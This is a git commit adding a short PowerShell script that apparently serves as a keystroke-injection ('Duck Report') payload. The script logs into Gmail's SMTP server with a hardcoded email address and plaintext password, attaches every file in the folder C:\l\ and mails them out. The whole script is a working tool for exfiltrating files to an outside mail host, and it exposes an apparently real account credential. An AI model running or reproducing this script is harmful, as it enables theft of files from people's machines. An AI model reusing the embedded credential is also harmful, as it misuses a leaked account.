c226460f98b5440a627a65761d79a3a48866cd75
apisapisapis <68765833+apisapisapis@users.noreply.github.com>
2020-08-08 16:20:50 -0300

    Add files via upload

---
+++ emailPowerShellCode.ps1
@@ -0,0 +1,18 @@
+$SMTPServer = 'smtp.gmail.com'
+$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+$SMTPInfo.EnableSsl = $true
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('migapis@hotmail.com', 'eternidade');
+$ReportEmail = New-Object System.Net.Mail.MailMessage
+$ReportEmail.From = 'migapis@hotmail.com'
+$ReportEmail.To.Add('migapis@hotmail.com')
+$ReportEmail.Subject = 'Duck Report'
+$ReportEmail.Body = 'Attached is your duck report.... Quack' 
+$files=Get-ChildItem "C:\l\"
+Foreach($file in $files)
+{
+Write-Host “Attaching File :- ” $file
+$attachment = New-Object System.Net.Mail.Attachment –ArgumentList C:\l\$file
+$ReportEmail.Attachments.Add($attachment)
+$SMTPInfo.Send($ReportEmail)
+}
+write-host "Mail Sent Successfully"
